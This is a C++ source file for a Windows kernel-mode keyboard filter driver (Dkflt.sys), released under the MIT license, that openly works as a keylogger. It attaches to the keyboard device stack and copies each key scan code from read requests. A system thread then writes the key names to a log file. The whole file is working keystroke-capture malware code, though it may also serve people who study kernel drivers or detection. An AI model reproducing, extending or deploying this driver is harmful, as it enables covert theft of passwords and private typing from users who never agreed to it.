//------------------------------------------------------------------------------
// ╔═══╗╔══╗╔═══╗╔════╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗
// ╚╗╔╗║╚╣─╝║╔═╗║║╔╗╔╗║║╔═╗║║║╚╗║║║╔═╗║║╔══╝
// ─║║║║─║║─║╚══╗╚╝║║╚╝║║─║║║╔╗╚╝║║║─╚╝║╚══╗
// ─║║║║─║║─╚══╗║──║║──║╚═╝║║║╚╗║║║║─╔╗║╔══╝
// ╔╝╚╝║╔╣─╗║╚═╝║──║║──║╔═╗║║║─║║║║╚═╝║║╚══╗
// ╚═══╝╚══╝╚═══╝──╚╝──╚╝─╚╝╚╝─╚═╝╚═══╝╚═══╝
// 
// Copyright Ⓒ 0xlay. All rights reserved.
// 
// This source file is licensed under the terms of MIT license.
// For details, please read the LICENSE file.
// 
// File: Dkflt.cpp
// 
// Creator: 0xlay
// 
// Environment: Kernel mode only
//
// Module: Dkflt.sys
//
//------------------------------------------------------------------------------


#include "Dkflt.hpp"
#include "Kfilter.hpp"
#include "DkfltCommon.hpp"
#include "ScanCode.hpp"


#include "Trace.h"
#pragma warning(push)
#pragma warning(disable : 4002)
#include "Dkflt.tmh"
#pragma warning(pop)


////////////////////////////////////////////////////////////////////////////////
//
// Dispatching functions
//
////////////////////////////////////////////////////////////////////////////////

#ifdef ALLOC_PRAGMA

#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, DkfltUnload)
#pragma alloc_text(PAGE, DkfltAddDevice)
#pragma alloc_text(PAGE, DkfltReadDispatch)

#endif // ALLOC_PRAGMA


DRIVER_DATA g_DriverData;


////////////////////////////////////////////////////////////////////////////////
//
//  DriverEntry
//
//      This routine called by windows when the driver is first loaded.
//
//  INPUTS:
//
//      DriverObject - Address of the DRIVER_OBJECT created by windows for
//                     this driver.
//
//      RegistryPath - UNICODE_STRING which keeps path to to the driver's
//                     Parameters key in the registry.
//
//  OUTPUTS:
//
//      None.
//
//  RETURNS:
//
//      STATUS_SUCCESS, otherwise an error.
//
//  IRQL:
//
//      This routine is called at IRQL == PASSIVE_LEVEL.
//
//  NOTES:
//
////////////////////////////////////////////////////////////////////////////////
_Use_decl_annotations_
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    //
    // Initialize WPP Tracing in DriverEntry
    //

    WPP_INIT_TRACING(DriverObject, RegistryPath);

    TraceDriverInfo("Entering %!FUNC!()\n");

    g_DriverData.DriverObject = DriverObject;
    g_DriverData.RegistryPath = RegistryPath;

    auto ntStatus = STATUS_SUCCESS;
    OBJECT_ATTRIBUTES obj{};

    DriverObject->DriverUnload = DkfltUnload;
    DriverObject->DriverExtension->AddDevice = DkfltAddDevice;

    for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
    {
        DriverObject->MajorFunction[i] = DkfltPassDispatch;
    }

    DriverObject->MajorFunction[IRP_MJ_READ] = DkfltReadDispatch;
    DriverObject->MajorFunction[IRP_MJ_PNP] = DkfltPnpDispatch;

    //
    // Create event
    //

    g_DriverData.ThreadIsRun = true;
    g_DriverData.LogEvent = new KeEvent();
    if (!g_DriverData.LogEvent)
    {
        ntStatus = STATUS_INSUFFICIENT_RESOURCES;
        TraceDriverError("%!FUNC!() IRQL: %!irql! "
                         "Error msg: The KeEvent wasn't created! "
                         "NTSTATUS: %!STATUS!\n",
                         KeGetCurrentIrql(), ntStatus);
        goto exit;
    }

    //
    // Create logger
    //

    g_DriverData.Keylogger = new Logger();
    if (!g_DriverData.LogEvent)
    {
        ntStatus = STATUS_INSUFFICIENT_RESOURCES;
        TraceDriverError("%!FUNC!() IRQL: %!irql! "
                         "Error msg: The Logger wasn't created! "
                         "NTSTATUS: %!STATUS!\n",
                         KeGetCurrentIrql(), ntStatus);
        goto exit;
    }

    ntStatus = g_DriverData.Keylogger->Open(D_KFILTER_LOG_FILE);
    if (!NT_SUCCESS(ntStatus))
    {
        TraceDriverError("%!FUNC!() IRQL: %!irql! "
                         "Error msg: The Logger couldn't open the log file! "
                         "NTSTATUS: %!STATUS!\n",
                          KeGetCurrentIrql(), ntStatus);
        goto exit;
    }

    //
    // Create system thread for logging keys
    //

    InitializeObjectAttributes(&obj, nullptr, OBJ_KERNEL_HANDLE, nullptr, nullptr);

    ntStatus = PsCreateSystemThread(&g_DriverData.LoggingThread,
                                    THREAD_ALL_ACCESS,
                                    &obj,
                                    nullptr,
                                    nullptr,
                                    LoggingThreadtRoutine,
                                    nullptr);
    if (!NT_SUCCESS(ntStatus))
    {
        TraceDriverError("%!FUNC!() IRQL: %!irql! "
            "Error msg: System thread wasn't created! "
            "NTSTATUS: %!STATUS!\n",
            KeGetCurrentIrql(), ntStatus);
        goto exit;
    }

    exit:
    TraceDriverInfo("Leaving %!FUNC!() NtStatus: %!STATUS!\n", ntStatus);

    if (!NT_SUCCESS(ntStatus))
    {
        g_DriverData.ThreadIsRun = false;
        if (g_DriverData.LoggingThread)
        {
            ZwClose(g_DriverData.LoggingThread);
        }
        delete g_DriverData.Keylogger;
        delete g_DriverData.LogEvent;
    }

    return ntStatus;
}


////////////////////////////////////////////////////////////////////////////////
//
//  DkfltUnload
//
//      This routine unloads driver.
//
//  INPUTS:
//
//      DriverObject - Address of the DRIVER_OBJECT created by windows for
//                     this driver.
//
//  OUTPUTS:
//
//      None.
//
//  RETURNS:
//
//      None.
//
//  IRQL:
//
//      This routine is called at IRQL == PASSIVE_LEVEL.
//
//  NOTES:
//
////////////////////////////////////////////////////////////////////////////////
_Use_decl_annotations_
VOID DkfltUnload(PDRIVER_OBJECT DriverObject)
{
    PAGED_CODE();

    TraceDriverInfo("Entering %!FUNC!()\n");

    //
    // Stop thread
    //

    g_DriverData.ThreadIsRun = false;

    //
    // Wait to stop thread
    //

    PETHREAD thread{};
    ObReferenceObjectByHandle(g_DriverData.LoggingThread,
                              THREAD_ALL_ACCESS,
                              *PsThreadType,
                              KernelMode,
                              reinterpret_cast<PVOID*>(&thread),
                              nullptr);

    KeWaitForSingleObject(thread,
                          Executive,
                          KernelMode,
                          FALSE,
                          nullptr);

    ObDereferenceObject(thread);

    //
    // Clear
    //

    ZwClose(g_DriverData.LoggingThread);
    delete g_DriverData.Keylogger;
    delete g_DriverData.LogEvent;

    TraceDriverInfo("Leaving %!FUNC!()\n");

    //
    // WPP Cleanup
    //
    WPP_CLEANUP(DriverObject);
}


////////////////////////////////////////////////////////////////////////////////
//
//  DkfltAddDevice
//
//      This routine adds a new DEVICE_OBJECT.
//
//  INPUTS:
//
//      DriverObject - Address of the DRIVER_OBJECT created by windows for
//                     this driver.
//
//      PhysicalDeviceObject - Address of the physical device object.
//
//  OUTPUTS:
//
//      None.
//
//  RETURNS:
//
//      STATUS_SUCCESS, otherwise an error.
//
//  IRQL:
//
//      This routine is called at IRQL == PASSIVE_LEVEL.
//
//  NOTES:
//
////////////////////////////////////////////////////////////////////////////////
_Use_decl_annotations_
NTSTATUS DkfltAddDevice(PDRIVER_OBJECT DriverObject, 
                        PDEVICE_OBJECT PhysicalDeviceObject)
{
    PAGED_CODE()
    auto ntStatus = STATUS_SUCCESS;

    TraceDeviceInfo("Entering %!FUNC!() IRQL: %!irql!\n", KeGetCurrentIrql());

    auto kfilter = CreateKfilter(DriverObject, PhysicalDeviceObject);
    if (!kfilter)
    {
        // 
        // Translates to the Win32 error ERROR_NOT_ENOUGH_MEMORY
        //
        ntStatus = STATUS_NO_MEMORY;
        TraceDeviceError("%!FUNC!() IRQL: %!irql! "
                         "Error msg: The Dkflt couldn't create the Kfilter! "
                         "NTSTATUS: %!STATUS!\n",
                         KeGetCurrentIrql(), ntStatus);
        goto exit;
    }

    ntStatus = kfilter->Attach(PhysicalDeviceObject);
    if (!NT_SUCCESS(ntStatus))
    {
        TraceDeviceError("%!FUNC!() IRQL: %!irql! "
                         "Error msg: The Kfilter couldn't attach to device! "
                         "NTSTATUS: %!STATUS!\n",
                         KeGetCurrentIrql(), ntStatus);
        goto exit;
    }

    exit:
    TraceDeviceInfo("Leaving %!FUNC!() NtStatus: %!STATUS!\n", ntStatus);

    return ntStatus;
}


////////////////////////////////////////////////////////////////////////////////
//
//  DkfltReadDispatch
//
//      This routine dispatching IRP_MJ_READ request.
//
//  INPUTS:
//
//      DeviceObject - Address of the upper-filter device object.
//
//      Irp - Address of the IRP that describes the requested I/O operation.
//
//  OUTPUTS:
//
//      None.
//
//  RETURNS:
//
//      STATUS_SUCCESS, otherwise an error.
//
//  IRQL:
//
//      This routine is called at IRQL <= APC_LEVEL.
//
//  NOTES:
//
////////////////////////////////////////////////////////////////////////////////
_Use_decl_annotations_
NTSTATUS DkfltReadDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PAGED_CODE()
    NT_ASSERT(Irp);
    auto ntStatus = STATUS_SUCCESS;

    auto kfilter = GetKfilter(DeviceObject);
    RemoveLockGuard lock(kfilter->GetRemoveLock(), Irp);

    TraceDeviceInfo("Entering %!FUNC!()  IRQL: %!irql!\n", KeGetCurrentIrql());

    IoCopyCurrentIrpStackLocationToNext(Irp);

    ntStatus = kfilter->SetFilterRoutine(Irp, ReadCompletionRoutine);
    if (!NT_SUCCESS(ntStatus))
    {
        TraceDeviceError("%!FUNC!() IRQL: %!irql! "
                         "Error msg: The Kfilter couldn't set filter routine! "
                         "NTSTATUS: %!STATUS!\n",
                         KeGetCurrentIrql(), ntStatus);
    }

    ntStatus = IoCallDriver(kfilter->GetLowerDevice(), Irp);

    TraceDeviceInfo("Leaving %!FUNC!() NTSTATUS: %!STATUS!\n", ntStatus);

    return ntStatus;
}


////////////////////////////////////////////////////////////////////////////////
//
//  ReadCompletionRoutine
//
//      This routine called when the next-lower driver completes the packet.
//
//  INPUTS:
//
//      DeviceObject - Address of the lower device object.
//
//      Irp - Address of the IRP that describes the requested I/O operation.
//
//      Context - Arguments.
//
//  OUTPUTS:
//
//      None.
//
//  RETURNS:
//
//      STATUS_SUCCESS, otherwise an error.
//
//  IRQL:
//
//      This routine is called at IRQL <= DISPATCH_LEVEL.
//
//  NOTES:
//
////////////////////////////////////////////////////////////////////////////////
_Use_decl_annotations_
NTSTATUS ReadCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
{
    UNREFERENCED_PARAMETER(Context);
    NT_ASSERT(Irp);

    auto ntStatus = STATUS_SUCCESS;
    enum { LShift = 0x2A, RShift = 0x36 };

    auto kfilter = GetKfilter(DeviceObject);
    RemoveLockGuard lock(kfilter->GetRemoveLock(), Irp);

    TraceDeviceInfo("Entering %!FUNC!() IRQL: %!irql!\n", KeGetCurrentIrql());

    memcpy(&g_DriverData.key,
           Irp->AssociatedIrp.SystemBuffer,
           sizeof(KEYBOARD_INPUT_DATA));

    if (g_DriverData.key.Flags == KEY_MAKE ||\
        g_DriverData.key.MakeCode == LShift ||\
        g_DriverData.key.MakeCode == RShift)
    {
        g_DriverData.LogEvent->Set();
    }

    if (Irp->PendingReturned)
    {
        IoMarkIrpPending(Irp);
    }

    if (Irp->IoStatus.Status == STATUS_MORE_PROCESSING_REQUIRED)
    {
        ntStatus = STATUS_MORE_PROCESSING_REQUIRED;
    }
    else
    {
        ntStatus = STATUS_CONTINUE_COMPLETION;
    }

    TraceDeviceInfo("Leaving %!FUNC!() NTSTATUS: %!STATUS!\n", ntStatus);

    return ntStatus;
}


////////////////////////////////////////////////////////////////////////////////
//
//  DkfltPnpDispatch
//
//      This routine dispatching IRP_MJ_PNP request.
//
//  INPUTS:
//
//      DeviceObject - Address of the upper-filter device object.
//
//      Irp - Address of the IRP that describes the requested I/O operation.
//
//  OUTPUTS:
//
//      None.
//
//  RETURNS:
//
//      STATUS_SUCCESS, otherwise an error.
//
//  IRQL:
//
//      This routine is called at IRQL <= DISPATCH_LEVEL.
//
//  NOTES:
//
////////////////////////////////////////////////////////////////////////////////
_Use_decl_annotations_
NTSTATUS DkfltPnpDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    NT_ASSERT(Irp);

    auto ntStatus = STATUS_SUCCESS;

    auto kfilter = GetKfilter(DeviceObject);
    kfilter->Lock(Irp);

    TraceDeviceInfo("Entering %!FUNC!() IRQL: %!irql!\n", KeGetCurrentIrql());

    auto stack = IoGetCurrentIrpStackLocation(Irp);
    switch (stack->MinorFunction)
    {
        case IRP_MN_START_DEVICE:
        {
            TraceDeviceInfo("%!FUNC!() IRQL: %!irql! IRP: [IRP_MN_START_DEVICE]\n",
                            KeGetCurrentIrql());
            break;
        }
        case IRP_MN_STOP_DEVICE:
        {
            TraceDeviceInfo("%!FUNC!() IRQL: %!irql! IRP: [IRP_MN_STOP_DEVICE]\n",
                            KeGetCurrentIrql());
            break;
        }
        case IRP_MN_REMOVE_DEVICE:
        {
            TraceDeviceInfo("%!FUNC!() IRQL: %!irql! IRP: [IRP_MN_REMOVE_DEVICE]\n",
                            KeGetCurrentIrql());

            IoSkipCurrentIrpStackLocation(Irp);
            ntStatus = IoCallDriver(kfilter->GetLowerDevice(), Irp);

            RemoveKfilter(kfilter, Irp);

            TraceDeviceInfo("Leaving %!FUNC!() NTSTATUS: %!STATUS!\n", ntStatus);

            return ntStatus;
        }
    }

    IoSkipCurrentIrpStackLocation(Irp);
    ntStatus = IoCallDriver(kfilter->GetLowerDevice(), Irp);

    TraceDeviceInfo("Leaving %!FUNC!() NTSTATUS: %!STATUS!\n", ntStatus);

    kfilter->Unlock(Irp);

    return ntStatus;
}


////////////////////////////////////////////////////////////////////////////////
//
//  DkfltPassDispatch
//
//      This routine is a placeholder for other IRP requests.
//
//  INPUTS:
//
//      DeviceObject - Address of the upper-filter device object.
//
//      Irp - Address of the IRP that describes the requested I/O operation.
//
//  OUTPUTS:
//
//      None.
//
//  RETURNS:
//
//      STATUS_SUCCESS, otherwise an error.
//
//  IRQL:
//
//      This routine is called at IRQL <= DISPATCH_LEVEL.
//
//  NOTES:
//
////////////////////////////////////////////////////////////////////////////////
_Use_decl_annotations_
NTSTATUS DkfltPassDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    NT_ASSERT(Irp);

    auto kfilter = GetKfilter(DeviceObject);
    RemoveLockGuard lock(kfilter->GetRemoveLock(), Irp);

    IoSkipCurrentIrpStackLocation(Irp);

    return IoCallDriver(kfilter->GetLowerDevice(), Irp);
}

////////////////////////////////////////////////////////////////////////////////
//
// Logging thread routine implementation
//
////////////////////////////////////////////////////////////////////////////////

#ifdef ALLOC_PRAGMA

#pragma alloc_text(PAGE, LoggingThreadtRoutine)

#endif // ALLOC_PRAGMA


_Use_decl_annotations_
void LoggingThreadtRoutine([[maybe_unused]] PVOID Context)
{
    auto ntStatus = STATUS_SUCCESS;

    //
    // Logging start
    //

    while (g_DriverData.ThreadIsRun)
    {
        ntStatus = g_DriverData.LogEvent->Wait();
        TraceDriverInfo("%!FUNC!() IRQL: %!irql! NTSTATUS: %!STATUS!\n", 
                        KeGetCurrentIrql(),
                        ntStatus);

        ntStatus = g_DriverData.Keylogger->Write(
            ScanCodeToVKeyName(g_DriverData.key.MakeCode)
        );
        if (!NT_SUCCESS(ntStatus))
        {
            TraceDriverError("%!FUNC!() IRQL: %!irql! "
                             "Error msg: The Logger couldn't write info to the log file! "
                             "NTSTATUS: %!STATUS!\n",
                             KeGetCurrentIrql(), ntStatus);
        }
    }

    PsTerminateSystemThread(ntStatus);
}
